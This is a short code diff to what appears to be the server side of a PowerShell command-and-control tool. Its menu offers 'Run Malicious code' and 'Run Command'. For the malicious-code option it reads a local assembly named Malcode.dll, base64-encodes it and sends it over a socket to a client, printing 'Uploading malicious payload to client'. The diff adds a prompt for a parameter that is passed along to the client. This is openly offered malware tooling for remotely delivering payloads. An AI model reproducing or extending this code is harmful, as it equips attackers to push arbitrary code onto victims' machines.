@@ -25,7 +25,6 @@ try{
         2. Run Malicious code
         3. Run Command
         4. Quit
-
 "
         
         if ($action -eq 1){
@@ -39,10 +38,12 @@ try{
         elseif ($action -eq 2){
             $sw.WriteLine("action=2")
             Write-Host "Uploading malicious payload to client"
-            $assemblyPath = 'D:\Programming\C#\YahudScript\Malcode\Malcode.exe'
+            $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\YahudScript\Malcode\Malcode.dll'
             $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
             $assemblyString = [System.Convert]::ToBase64String($assemblyByte)
             $sw.WriteLine($assemblyString) # Server sending to the client
+            [String]$parameter = Read-Host "Enter Parameter"
+            $sw.WriteLine($parameter) # Sending parameter to the client
 
         }
 
